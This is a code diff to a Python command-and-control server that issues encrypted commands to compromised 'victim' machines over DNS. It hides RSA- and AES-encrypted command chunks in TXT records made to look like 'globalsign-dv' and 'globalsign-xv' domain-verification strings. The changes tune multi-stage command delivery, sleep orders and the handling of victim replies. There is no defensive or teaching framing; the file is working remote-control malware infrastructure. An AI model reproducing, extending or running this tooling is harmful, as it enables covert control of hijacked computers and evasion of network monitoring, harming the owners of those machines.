@@ -363,13 +363,14 @@ class VictimPayloads:
                 currentEncodedCommand.clear()
                 sleepTime = kwargs.get('sleepTime', None)
                 console.print(f"[bold yellow][*][/bold yellow] Sent \"sleep\" command to victim, sleeping for {sleepTime} seconds...\n")
-                packet = public_key_hash + "|" + "s" + "|" + str(sleepTime)
-                print(packet)
+                packet = "|" + "s" + "|" + str(sleepTime)
+                print(f"{packet} | {machineClassList[public_key_hash].RSA_Victim_Public_Key}")
                 ciphertext = utils.RSAEncrypt(packet.encode(), machineClassList[public_key_hash].RSA_Victim_Public_Key)
-                machineClassList[public_key_hash].change_last_sleep(int(sleepTime))
+          #      machineClassList[public_key_hash].change_last_sleep(int(sleepTime))
                 command_split = [ciphertext[i: i + 220] for i in range(0, len(ciphertext), 220)]
                 for x in command_split:
                     currentEncodedCommand.append(f"globalsign-dv={x.decode()}")
+                print(f"{currentEncodedCommand}")
                 return currentEncodedCommand
 
             case "command":
@@ -377,6 +378,8 @@ class VictimPayloads:
 
                 # Execute first stage of command execution, AES key generation and RSA encrypted deployment
                 currentEncodedCommand.clear()
+                multiStagePayloadContent.clear()
+
                 command = kwargs.get('command', None)[1:]
                 command = ' '.join(command)
                 AESKey = machineClassList[public_key_hash].AESKey
@@ -387,6 +390,7 @@ class VictimPayloads:
                 for x in command_split:
                     currentEncodedCommand.append(f"globalsign-dv={x.decode()}")
                 console.print(f"[bold yellow][*][/bold yellow] Sent \"{command}\" to victim\n")
+               #  print(f"\nFirst stage :: {currentEncodedCommand} for command {command}")
                 packet = public_key_hash + "|" + "c" + "|" + command
                 encodedCommand = AESencrypt(machineClassList[public_key_hash].AESKey, packet)
                 for x in encodedCommand:
@@ -395,6 +399,7 @@ class VictimPayloads:
                 encodedCommand_split = [b32EncodedCommand[i: i + 220] for i in range(0, len(b32EncodedCommand), 220)]
                 for x in encodedCommand_split:
                     multiStagePayloadContent.append(f"globalsign-xv={x}")
+                #print(f"Last stage :: {multiStagePayloadContent} for command {command}")
                 return currentEncodedCommand
 
     def ListenerToProtoSender(proto):
@@ -410,7 +415,6 @@ class VictimPayloads:
 
     def command(self, command, public_key_hash):
         global commandMode, currentEncodedCommand, stagedPayload, multiStagePayloadContent
-        multiStagePayloadContent.clear()
         packet = self.MethodToPacketEncoder("command", public_key_hash, command=command)
         commandMode = True
         currentEncodedCommand = packet
@@ -478,8 +482,10 @@ def victimInteract(public_key_hash):
 
             if(issuedCommand[0] == commands[8]):
                 victimHandler.command(issuedCommand, public_key_hash);
+        except IndexError:
+            pass
         except Exception:
-           # console.print_exception(show_locals=True)
+            console.print_exception(show_locals=True)
             pass
 
 
@@ -624,10 +630,10 @@ def generateCertificate():
 
 generatedRSAKeyUsed = False
 authenticatedCommand_cmd = False
-
+authStage = 0
+backData = ""
 def decodeCommand(command):
-
-    global statistics, commandMode, generatedCertificates, latestVictim, c2Statistics, generatedRSAKeyUsed, certificate, authenticatedCommand_cmd
+    global statistics, backData, commandMode, generatedCertificates, currentEncodedCommand, latestVictim, c2Statistics, generatedRSAKeyUsed, certificate, authenticatedCommand_cmd, authStage, multiStagePayloadContent
     try:
         command = base64.b32decode(command).decode()
         command = command.split("|")
@@ -659,13 +665,20 @@ def decodeCommand(command):
         if(command[0] == "s"):
             console.print(f"[bold blue]Spaceship {command[1]} understood the orders![/bold blue]")
             commandMode = False
+
         if(command[0] == "2c"):
-            authenticatedCommand_cmd = True
             if len(command) > 2:
                 data = AESdecrypt(machineClassList[command[1]].AESKey, command[2]).split("|")
-                console.print("\n" + data[0])
+                if backData != command:
+                    console.print("\n" + data[0])
+                backData = command
                 multiStagePayloadContent.clear()
                 authenticatedCommand_cmd = False
+                authStage = 0
+            else:
+                currentEncodedCommand.clear()
+                authStage = 1
+                authenticatedCommand_cmd = True
 
     except Exception:
         console.print_exception(show_locals=True)
@@ -759,7 +772,7 @@ records = {
 
 
 def sendDNSresponse(data):
-    global keyProvisioning, commandMode, currentEncodedCommand, generatedRSAKeyUsed, certificate, stagedPayload_cmd, multiStagePayloadContent, authenticatedCommand_cmd
+    global keyProvisioning, commandMode, currentEncodedCommand, generatedRSAKeyUsed, certificate, stagedPayload_cmd, multiStagePayloadContent, authenticatedCommand_cmd, authStage
     try:
         request = DNSRecord.parse(data)
         reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
@@ -773,21 +786,43 @@ def sendDNSresponse(data):
             reply.add_answer(RR(rname=qname, rtype=QTYPE.AAAA, ttl=5, rdata=dns.AAAA(IPV6)))
         if qt == "TXT":
 #            console.print(f"Command mode :: {commandMode}")
-            if authenticatedCommand_cmd == True and commandMode == True:
+            if authStage == 0 and authenticatedCommand_cmd == False and commandMode == True and len(currentEncodedCommand) > 0:
+            #    print(f"Serving first stage of payload {authStage} {authenticatedCommand_cmd}")
+                reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=5, rdata=dns.TXT(currentEncodedCommand)))
+                return reply.pack()
+
+            if authStage > 0 and authenticatedCommand_cmd == True and commandMode == True and len(multiStagePayloadContent) > 0:
+                authStage = 0
+#                print(f"Serving N stage of payload {authStage} {authenticatedCommand_cmd} {commandMode}")
                 reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=5, rdata=dns.TXT(multiStagePayloadContent)))
                 return reply.pack()
-		# multiStagePayloadContent.clear()
                 
             if keyProvisioning == False and authenticatedCommand_cmd == False:
+ #               print("Serving nothing!")
                 reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=5, rdata=dns.TXT("")))
+                return reply.pack()
+
             if commandMode == False and authenticatedCommand_cmd == False:
+  #              print("Serving certificate")
                 reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=5, rdata=dns.TXT(certificate)))
+                return reply.pack()
+
+            if commandMode == True and authenticatedCommand_cmd == False and len(currentEncodedCommand) > 0:
+   #             print("Serving current encoded command!")
+                reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=5, rdata=dns.TXT(currentEncodedCommand)))
+                return reply.pack()
+
+            if len(multiStagePayloadContent) > 0 and len(currentEncodedCommand) == 0:
+                reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=5, rdata=dns.TXT(multiStagePayloadContent)))
+                return reply.pack()
+
             else:
                 reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=5, rdata=dns.TXT(currentEncodedCommand)))
+                return reply.pack()
+
         return reply.pack()
-    except:
-        #print(err)
-        pass
+    except Exception:
+        console.print_exception(show_locals=True)
 
 class DNSServer:
    def __init__(self, address, port, domain):
@@ -823,6 +858,8 @@ class DNSServer:
                        if(len(receivedData) > len(self.domain+".")):
                            dnsDataParse(receivedData)
                     #c2Statistics["Invalid Requests"] += 1
+           except IndexError:
+               pass
            except Exception:
                console.print_exception(show_locals=True)
                pass
